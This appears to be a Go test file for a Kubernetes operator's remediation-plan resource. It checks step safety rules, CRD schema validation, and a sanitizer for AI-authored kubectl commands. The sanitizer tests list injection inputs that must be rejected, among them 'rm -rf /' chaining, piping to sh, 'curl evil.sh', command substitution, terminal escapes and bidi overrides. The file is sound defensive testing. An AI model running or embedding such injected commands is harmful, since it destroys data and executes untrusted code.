/*
Copyright 2026.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
*/

package v1

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"unicode"

	"github.com/stretchr/testify/require"
	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

func jsonPtr(t *testing.T, raw string) *apiextensionsv1.JSON {
	t.Helper()
	return &apiextensionsv1.JSON{Raw: []byte(raw)}
}

// TestEffectiveSteps covers the back-compat normalizer: explicit Steps win,
// otherwise a single step is synthesized from the legacy Action, otherwise empty.
func TestEffectiveSteps(t *testing.T) {
	t.Run("returns Steps when present", func(t *testing.T) {
		ra := &RemediationAction{
			Spec: RemediationActionSpec{
				// Action is also set to prove Steps takes precedence.
				Action: RemediationActionDetail{Type: StepTypePersonaUpdate},
				Steps: []RemediationStep{
					{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true,
						Patch: jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`)},
					{Order: 2, ID: "b", Type: StepTypeRestart},
				},
			},
		}

		got := ra.EffectiveSteps()
		require.Len(t, got, 2)
		require.Equal(t, "a", got[0].ID)
		require.Equal(t, "b", got[1].ID)

		// Returned slice must be a deep copy — mutating string fields AND pointer
		// (Patch) fields on the result must not affect the source spec.
		got[0].ID = "mutated"
		got[0].Patch.Raw = []byte(`{"changed":true}`)
		require.Equal(t, "a", ra.Spec.Steps[0].ID)
		require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), ra.Spec.Steps[0].Patch.Raw)
	})

	t.Run("synthesizes auto-executable step from legacy persona-update action", func(t *testing.T) {
		ra := &RemediationAction{
			Spec: RemediationActionSpec{
				Explanation: "bump memory limit",
				Action: RemediationActionDetail{
					Type:          StepTypePersonaUpdate,
					Patch:         jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`),
					PrePatchState: jsonPtr(t, `{"spec":{"resources":{"memory":"256Mi"}}}`),
				},
			},
		}

		got := ra.EffectiveSteps()
		require.Len(t, got, 1)
		require.Equal(t, int32(1), got[0].Order)
		require.Equal(t, StepTypePersonaUpdate, got[0].Type)
		require.Equal(t, "bump memory limit", got[0].Description)
		require.True(t, got[0].AutoExecutable)
		// Patch fields are deep-copied (equal by value, independent by pointer).
		require.Equal(t, ra.Spec.Action.Patch.Raw, got[0].Patch.Raw)
		require.NotSame(t, ra.Spec.Action.Patch, got[0].Patch)
		require.Equal(t, ra.Spec.Action.PrePatchState.Raw, got[0].PrePatchState.Raw)
		require.NotSame(t, ra.Spec.Action.PrePatchState, got[0].PrePatchState)

		// Mutating the synthesized step must not corrupt the source Action.
		got[0].Patch.Raw = []byte(`{"changed":true}`)
		require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), ra.Spec.Action.Patch.Raw)
	})

	t.Run("synthesizes advisory manual step from legacy non-persona action", func(t *testing.T) {
		for _, legacyType := range []string{ActionTypeNotification, ActionTypeGitPR} {
			ra := &RemediationAction{
				Spec: RemediationActionSpec{
					Action: RemediationActionDetail{Type: legacyType},
				},
			}

			got := ra.EffectiveSteps()
			require.Len(t, got, 1)
			// notification/git-pr are advisory: mapped to the in-enum "manual" type.
			require.Equal(t, StepTypeManual, got[0].Type)
			require.False(t, got[0].AutoExecutable)
		}
	})

	t.Run("empty when neither Steps nor Action set", func(t *testing.T) {
		ra := &RemediationAction{}
		require.Empty(t, ra.EffectiveSteps())
	})

	t.Run("nil receiver is safe", func(t *testing.T) {
		var ra *RemediationAction
		require.Nil(t, ra.EffectiveSteps())
	})
}

// TestValidateAutoExecutable asserts the v1 step-safety invariant: only
// persona-update steps may be AutoExecutable.
func TestValidateAutoExecutable(t *testing.T) {
	tests := []struct {
		name    string
		steps   []RemediationStep
		wantErr bool
	}{
		{
			name:    "no steps",
			steps:   nil,
			wantErr: false,
		},
		{
			name: "persona-update auto-executable is allowed",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true},
			},
			wantErr: false,
		},
		{
			name: "non-persona auto-executable is rejected",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypePersonaUpdate, AutoExecutable: true},
				{Order: 2, ID: "b", Type: StepTypeWorkloadApply, AutoExecutable: true},
			},
			wantErr: true,
		},
		{
			name: "non-persona advisory step is allowed",
			steps: []RemediationStep{
				{Order: 1, ID: "a", Type: StepTypeScale, AutoExecutable: false},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ra := &RemediationAction{Spec: RemediationActionSpec{Steps: tt.steps}}
			err := ra.ValidateAutoExecutable()
			if tt.wantErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
		})
	}

	t.Run("nil receiver is safe", func(t *testing.T) {
		var ra *RemediationAction
		require.NoError(t, ra.ValidateAutoExecutable())
	})

	t.Run("reports every offending step", func(t *testing.T) {
		ra := &RemediationAction{Spec: RemediationActionSpec{Steps: []RemediationStep{
			{Order: 1, ID: "ok", Type: StepTypePersonaUpdate, AutoExecutable: true},
			{Order: 2, ID: "bad-a", Type: StepTypeWorkloadApply, AutoExecutable: true},
			{Order: 3, ID: "bad-b", Type: StepTypeScale, AutoExecutable: true},
		}}}

		err := ra.ValidateAutoExecutable()
		require.Error(t, err)
		require.Contains(t, err.Error(), "bad-a")
		require.Contains(t, err.Error(), "bad-b")
	})
}

// TestRemediationStepDeepCopyRoundTrip exercises the generated deepcopy for the
// new types, asserting deep independence of the JSON pointer fields.
func TestRemediationStepDeepCopyRoundTrip(t *testing.T) {
	now := metav1.Now()
	original := &RemediationAction{
		Spec: RemediationActionSpec{
			PlanSource:  PlanSourceAIAnthropic,
			PlanSummary: "root cause: memory pressure",
			Steps: []RemediationStep{
				{
					Order:          1,
					ID:             "step-1",
					Type:           StepTypePersonaUpdate,
					Description:    "raise memory limit",
					Rationale:      "OOMKilled observed",
					Risk:           "low",
					AutoExecutable: true,
					Patch:          jsonPtr(t, `{"spec":{"resources":{"memory":"512Mi"}}}`),
					PrePatchState:  jsonPtr(t, `{"spec":{"resources":{"memory":"256Mi"}}}`),
				},
			},
		},
		Status: RemediationActionStatus{
			CurrentStep: 1,
			StepStatuses: []StepStatus{
				{Order: 1, Phase: "Applied", AppliedAt: &now, VerificationResult: "Healthy"},
			},
		},
	}

	clone := original.DeepCopy()
	require.Equal(t, original, clone)
	require.NotSame(t, original, clone)

	// Mutating the clone's deep fields must not affect the original.
	clone.Spec.Steps[0].Patch.Raw = []byte(`{"changed":true}`)
	clone.Spec.Steps[0].ID = "mutated"
	clone.Status.StepStatuses[0].Phase = "Failed"
	require.Equal(t, []byte(`{"spec":{"resources":{"memory":"512Mi"}}}`), original.Spec.Steps[0].Patch.Raw)
	require.Equal(t, "step-1", original.Spec.Steps[0].ID)
	require.Equal(t, "Applied", original.Status.StepStatuses[0].Phase)
}

// TestRemediationActionBackCompatUnmarshal asserts that a legacy single-Action
// payload (no Steps) still unmarshals unchanged and round-trips.
func TestRemediationActionBackCompatUnmarshal(t *testing.T) {
	raw := `{
		"incidentRef": {"name": "inc-1", "namespace": "default"},
		"personaRef": {"name": "app-1", "kind": "ApplicationPersona"},
		"trustLevel": 2,
		"action": {"type": "persona-update", "patch": {"spec":{"resources":{"memory":"512Mi"}}}},
		"explanation": "raise memory",
		"confidence": "0.9"
	}`

	var spec RemediationActionSpec
	require.NoError(t, json.Unmarshal([]byte(raw), &spec))
	require.Equal(t, ActionTypePersonaUpdate, spec.Action.Type)
	require.Empty(t, spec.Steps)
	require.Empty(t, spec.PlanSource)

	// New optional fields are omitted on marshal for legacy objects.
	out, err := json.Marshal(spec)
	require.NoError(t, err)
	require.NotContains(t, string(out), "steps")
	require.NotContains(t, string(out), "planSource")
	require.NotContains(t, string(out), "stepStatuses")
}

// TestRemediationStepsEnumInGeneratedCRD is a schema-marker check: it loads the
// generated CRD and asserts the kubebuilder enum markers produced the expected
// OpenAPI enum for step Type — so an out-of-enum value is rejected at apply time.
func TestRemediationStepsEnumInGeneratedCRD(t *testing.T) {
	path := filepath.Join("..", "..", "config", "crd", "bases", "dorgu.io_remediationactions.yaml")
	data, err := os.ReadFile(path)
	require.NoError(t, err, "run `make manifests` to generate the CRD")

	var crd apiextensionsv1.CustomResourceDefinition
	require.NoError(t, yaml.Unmarshal(data, &crd))
	require.NotEmpty(t, crd.Spec.Versions)

	schema := crd.Spec.Versions[0].Schema.OpenAPIV3Schema
	steps, ok := schema.Properties["spec"].Properties["steps"]
	require.True(t, ok, "spec.steps missing from CRD schema")

	stepType := steps.Items.Schema.Properties["type"]
	enum := make([]string, 0, len(stepType.Enum))
	for _, e := range stepType.Enum {
		var s string
		require.NoError(t, json.Unmarshal(e.Raw, &s))
		enum = append(enum, s)
	}

	require.ElementsMatch(t, []string{
		StepTypePersonaUpdate, StepTypeWorkloadApply, StepTypeRestart,
		StepTypeScale, StepTypeConfigChange, StepTypeManual,
	}, enum)
	require.NotContains(t, enum, "delete-namespace", "out-of-enum type must not be accepted")

	// planSource enum is also present.
	planSource := schema.Properties["spec"].Properties["planSource"]
	planEnum := make([]string, 0, len(planSource.Enum))
	for _, e := range planSource.Enum {
		var s string
		require.NoError(t, json.Unmarshal(e.Raw, &s))
		planEnum = append(planEnum, s)
	}
	require.ElementsMatch(t, []string{PlanSourceRuleBased, PlanSourceAIAnthropic}, planEnum)

	// The step-safety invariant is enforced at the API server via a CEL rule:
	// a step may be autoExecutable only when its type is persona-update.
	// The command guard is enforced the same way: a step command must be a
	// kubectl invocation, so the API server rejects anything else even if a
	// client bypasses SanitizeStepCommand.
	celRules := make([]string, 0, len(steps.Items.Schema.XValidations))
	for _, r := range steps.Items.Schema.XValidations {
		celRules = append(celRules, r.Rule)
	}
	require.NotEmpty(t, celRules, "RemediationStep must carry XValidation CEL rules")

	require.Condition(t, func() bool {
		for _, r := range celRules {
			if strings.Contains(r, "self.autoExecutable") && strings.Contains(r, StepTypePersonaUpdate) {
				return true
			}
		}
		return false
	}, "missing the autoExecutable CEL rule, got %v", celRules)

	require.Condition(t, func() bool {
		for _, r := range celRules {
			if strings.Contains(r, "self.command") && strings.Contains(r, "kubectl ") {
				return true
			}
		}
		return false
	}, "missing the command CEL rule, got %v", celRules)

	command := steps.Items.Schema.Properties["command"]
	require.Equal(t, "string", command.Type, "spec.steps[].command missing from CRD schema")
	require.NotNil(t, command.MaxLength)
	require.Equal(t, int64(MaxStepCommandLength), *command.MaxLength)
	require.NotContains(t, steps.Items.Schema.Required, "command", "command must stay optional")
}

// TestSanitizeStepCommand covers the display guard for model-authored step
// commands: only single-line kubectl invocations without shell metacharacters
// survive, everything else is dropped rather than repaired.
func TestSanitizeStepCommand(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "keeps a plain kubectl command",
			in:   "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
			want: "kubectl set image deployment/web web=nginx:1.27-alpine -n demo",
		},
		{
			name: "trims surrounding whitespace",
			in:   "  kubectl rollout restart deployment/web -n demo  ",
			want: "kubectl rollout restart deployment/web -n demo",
		},
		{
			name: "keeps a quoted JSON patch",
			in:   `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
			want: `kubectl patch deployment web -n demo --type merge -p '{"spec":{"replicas":3}}'`,
		},
		{name: "drops empty", in: "", want: ""},
		{name: "drops whitespace only", in: "   ", want: ""},
		{name: "drops a non-kubectl binary", in: "helm uninstall dorgu-operator", want: ""},
		{name: "drops bare kubectl with no arguments", in: "kubectl", want: ""},
		{name: "drops a kubectl-prefixed impostor", in: "kubectlfoo get pods", want: ""},
		{name: "drops command chaining", in: "kubectl get pods; rm -rf /", want: ""},
		{name: "drops backgrounded chaining", in: "kubectl get pods && curl evil.sh", want: ""},
		{name: "drops pipes", in: "kubectl get pods | sh", want: ""},
		{name: "drops redirection", in: "kubectl get pods > /etc/passwd", want: ""},
		{name: "drops command substitution", in: "kubectl delete ns $(cat /tmp/ns)", want: ""},
		{name: "drops backticks", in: "kubectl delete ns `cat /tmp/ns`", want: ""},
		{name: "drops variable expansion", in: "kubectl apply -f $HOME/evil.yaml", want: ""},
		{name: "drops a second line", in: "kubectl get pods\nrm -rf /", want: ""},
		{name: "drops a carriage return", in: "kubectl get pods\rrm -rf /", want: ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, SanitizeStepCommand(tt.in))
		})
	}

	t.Run("drops a command over the length bound", func(t *testing.T) {
		long := "kubectl annotate deployment web " + strings.Repeat("a", MaxStepCommandLength)
		require.Equal(t, "", SanitizeStepCommand(long))
	})

	t.Run("keeps a command at the length bound", func(t *testing.T) {
		prefix := "kubectl annotate deployment web note="
		at := prefix + strings.Repeat("a", MaxStepCommandLength-len(prefix))
		require.Len(t, at, MaxStepCommandLength)
		require.Equal(t, at, SanitizeStepCommand(at))
	})
}

// TestRemediationStepCRD_CarriesStructuredSafety pins the field the CLI renders
// the guardrail verdict from. Before it existed the verdict was a string prefix
// on the model-authored rationale, which meant it could not be filtered, alerted
// on, or told apart from the model's own opinion of the same change.
func TestRemediationStepCRD_CarriesStructuredSafety(t *testing.T) {
	path := filepath.Join("..", "..", "config", "crd", "bases", "dorgu.io_remediationactions.yaml")
	data, err := os.ReadFile(path)
	require.NoError(t, err, "run `make manifests` to generate the CRD")

	var crd apiextensionsv1.CustomResourceDefinition
	require.NoError(t, yaml.Unmarshal(data, &crd))

	steps := crd.Spec.Versions[0].Schema.OpenAPIV3Schema.
		Properties["spec"].Properties["steps"]
	safety, ok := steps.Items.Schema.Properties["safety"]
	require.True(t, ok, "spec.steps[].safety missing from CRD schema")
	require.NotContains(t, steps.Items.Schema.Required, "safety", "safety must stay optional")

	entry := safety.Items.Schema
	require.ElementsMatch(t, []string{"rule", "verdict", "field", "message"}, entry.Required,
		"the verdict, the field it is about and Dorgu's rendering of it are all mandatory")

	readEnum := func(prop string) []string {
		out := make([]string, 0, len(entry.Properties[prop].Enum))
		for _, e := range entry.Properties[prop].Enum {
			var s string
			require.NoError(t, json.Unmarshal(e.Raw, &s))
			out = append(out, s)
		}
		return out
	}

	require.ElementsMatch(t,
		[]string{SafetyRuleBlastRadius, SafetyRulePlanValidation, SafetyRuleAbsentField},
		readEnum("rule"))
	require.ElementsMatch(t,
		[]string{SafetyVerdictClamped, SafetyVerdictRejected, SafetyVerdictDerived},
		readEnum("verdict"))
}

// MaxPlanSteps is what the gate enforces; the CRD's maxItems is what the API server
// enforces. They are one number, and the marker cannot read a constant.
func TestMaxPlanSteps_IsTheCRDMaxItemsOfSpecSteps(t *testing.T) {
	raw, err := os.ReadFile("../../config/crd/bases/dorgu.io_remediationactions.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var crd struct {
		Spec struct {
			Versions []struct {
				Schema struct {
					OpenAPIV3Schema struct {
						Properties struct {
							Spec struct {
								Properties struct {
									Steps struct {
										MaxItems int `json:"maxItems"`
									} `json:"steps"`
								} `json:"properties"`
							} `json:"spec"`
						} `json:"properties"`
					} `json:"openAPIV3Schema"`
				} `json:"schema"`
			} `json:"versions"`
		} `json:"spec"`
	}
	if err := yaml.Unmarshal(raw, &crd); err != nil {
		t.Fatal(err)
	}
	if len(crd.Spec.Versions) == 0 {
		t.Fatal("the CRD has no versions")
	}
	if got := crd.Spec.Versions[0].Schema.OpenAPIV3Schema.Properties.Spec.Properties.Steps.MaxItems; got != MaxPlanSteps {
		t.Fatalf("CRD spec.steps maxItems = %d, MaxPlanSteps = %d", got, MaxPlanSteps)
	}
}

// F-7 and N-3: every control character, DEL, the Unicode line and paragraph
// separators, and every Unicode format character (category Cf: bidi overrides and
// isolates, zero-width characters, the byte order mark, the tag characters) are
// refused, wherever they sit in the command. They let a command rewrite the line a
// human reads (ESC sequences, a right-to-left override that reorders it), hide text
// (zero-width) or break it (NEL, VT, FF, U+2028, U+2029).
func isRefusedInCommand(r rune) bool {
	return r <= 0x1f || (r >= 0x7f && r <= 0x9f) || r == 0x2028 || r == 0x2029 || unicode.Is(unicode.Cf, r)
}

// commandCodePoints is every code point the API server rule and SanitizeStepCommand
// are compared on: the C3 review's U+0000 to U+2100 and three more, every Cf code
// point of the Unicode tables (U+00AD, U+0600 to U+0605, U+200B to U+200F, U+202A to
// U+202E, U+2060 to U+2064, U+2066 to U+206F, U+FEFF, U+FFF9 to U+FFFB, U+E0001, the
// tag characters U+E0020 to U+E007F and others above U+2100), and the neighbours of
// those ranges that are not Cf, which must stay accepted.
func commandCodePoints() []rune {
	var points []rune
	for r := rune(0); r <= 0x2100; r++ {
		if r >= 0xd800 && r <= 0xdfff {
			continue // surrogates are not characters
		}
		points = append(points, r)
	}
	points = append(points, 0xfeff, 0xfffd, 0x1f600)
	for _, rng := range unicode.Cf.R16 {
		for r := rune(rng.Lo); r <= rune(rng.Hi); r += rune(rng.Stride) {
			points = append(points, r)
		}
	}
	for _, rng := range unicode.Cf.R32 {
		for r := rune(rng.Lo); r <= rune(rng.Hi); r += rune(rng.Stride) {
			points = append(points, r)
		}
	}
	// Neighbours that are not format characters: a space, an unassigned point, an
	// object replacement character, a language tag block edge, a private use point.
	points = append(points, 0x200a, 0x2065, 0xfff8, 0xfffc, 0xe0000, 0xe0080, 0xe000, 0xf8ff, 0x10ffff)
	return slices.Compact(slices.Sorted(slices.Values(points)))
}

func TestSanitizeStepCommand_RejectsControlAndLineBreakCharacters(t *testing.T) {
	for _, r := range commandCodePoints() {
		in := "kubectl get pods" + string(r) + "x"
		got := SanitizeStepCommand(in)
		if isRefusedInCommand(r) {
			if got != "" {
				t.Errorf("U+%04X was accepted in %q", r, in)
			}
			continue
		}
		// Only the shell metacharacters otherwise refuse a command.
		if strings.ContainsRune(stepCommandForbidden, r) {
			if got != "" {
				t.Errorf("%q was accepted", in)
			}
			continue
		}
		if got != in {
			t.Errorf("U+%04X was refused: %q -> %q", r, in, got)
		}
	}
}

// N-3: the format characters a reader cannot see, by name. The list is written out,
// not taken from the Unicode tables, so a table that changed could not shrink it.
func TestSanitizeStepCommand_NamedFormatCharacters(t *testing.T) {
	for name, r := range map[string]rune{
		"soft hyphen": 0xad, "arabic number sign": 0x600, "arabic letter mark": 0x61c,
		"zero width space": 0x200b, "zero width non-joiner": 0x200c, "zero width joiner": 0x200d,
		"left-to-right mark": 0x200e, "right-to-left mark": 0x200f,
		"LRE": 0x202a, "RLE": 0x202b, "PDF": 0x202c, "LRO": 0x202d, "RLO": 0x202e,
		"word joiner": 0x2060, "invisible times": 0x2062, "invisible separator": 0x2063,
		"LRI": 0x2066, "RLI": 0x2067, "FSI": 0x2068, "PDI": 0x2069,
		"byte order mark": 0xfeff, "interlinear annotation anchor": 0xfff9,
		"language tag": 0xe0001, "tag latin a": 0xe0041, "cancel tag": 0xe007f,
	} {
		if got := SanitizeStepCommand("kubectl get pods " + string(r) + "-o wide"); got != "" {
			t.Errorf("%s (U+%04X) was accepted: %q", name, r, got)
		}
	}
	// Trojan Source: a right-to-left override that reorders what a human reads.
	if got := SanitizeStepCommand("kubectl get pods -n \u202eevil\u202c shop"); got != "" {
		t.Errorf("a bidi override was accepted: %q", got)
	}
	// Ordinary non-ASCII text and visible spaces are not format characters.
	for _, ok := range []string{"kubectl get pods -l 'app=café'", "kubectl get pods -l 'app=日本語'", "kubectl get pods\u00a0-n shop"} {
		if SanitizeStepCommand(ok) == "" {
			t.Errorf("%q was refused", ok)
		}
	}
}

func TestSanitizeStepCommand_NamedControlCharacters(t *testing.T) {
	for name, r := range map[string]rune{
		"NUL": 0x00, "BEL": 0x07, "backspace": 0x08, "tab": 0x09, "VT": 0x0b, "FF": 0x0c,
		"ESC": 0x1b, "DEL": 0x7f, "NEL": 0x85, "CSI": 0x9b, "line separator": 0x2028, "paragraph separator": 0x2029,
	} {
		if got := SanitizeStepCommand("kubectl get pods " + string(r) + "-o wide"); got != "" {
			t.Errorf("%s was accepted: %q", name, got)
		}
	}
	// A terminal escape sequence is the case the rule exists for.
	if got := SanitizeStepCommand("kubectl get pods \x1b[2K\rkubectl get nodes"); got != "" {
		t.Errorf("an escape sequence was accepted: %q", got)
	}
	// Surrounding whitespace is still trimmed, as before, and ordinary text passes.
	if got := SanitizeStepCommand("  kubectl get pods -n shop \n"); got != "kubectl get pods -n shop" {
		t.Errorf("surrounding whitespace: %q", got)
	}
	if got := SanitizeStepCommand("kubectl get pods -l 'app=café' -o jsonpath={.items[0].metadata.name}"); got == "" {
		t.Error("printable non-ASCII text was refused")
	}
}

// MaxApprovedByLength is what the gate enforces on the approver; the CRD's maxLength
// is what the API server enforces, on the field the approver writes and on the
// ticket's copy. One number.
func TestMaxApprovedByLength_IsTheCRDMaxLengthOfBothApprovedByFields(t *testing.T) {
	raw, err := os.ReadFile("../../config/crd/bases/dorgu.io_remediationactions.yaml")
	if err != nil {
		t.Fatal(err)
	}
	var crd map[string]any
	if err := yaml.Unmarshal(raw, &crd); err != nil {
		t.Fatal(err)
	}
	walk := func(path ...string) any {
		var cur any = crd
		for _, key := range path {
			m, ok := cur.(map[string]any)
			if !ok {
				t.Fatalf("no %q on the way to %v", key, path)
			}
			cur = m[key]
		}
		return cur
	}
	status := []string{"spec", "versions"}
	versions, ok := walk(status...).([]any)
	if !ok || len(versions) == 0 {
		t.Fatal("the CRD has no versions")
	}
	root := versions[0].(map[string]any)["schema"].(map[string]any)["openAPIV3Schema"].(map[string]any)["properties"].(map[string]any)["status"].(map[string]any)["properties"].(map[string]any)
	fields := map[string]any{
		"status.approvedBy":             root["approvedBy"],
		"status.applyTicket.approvedBy": root["applyTicket"].(map[string]any)["properties"].(map[string]any)["approvedBy"],
	}
	for name, field := range fields {
		got, _ := field.(map[string]any)["maxLength"].(float64)
		if int(got) != MaxApprovedByLength {
			t.Errorf("%s maxLength = %v, MaxApprovedByLength = %d", name, got, MaxApprovedByLength)
		}
	}
}
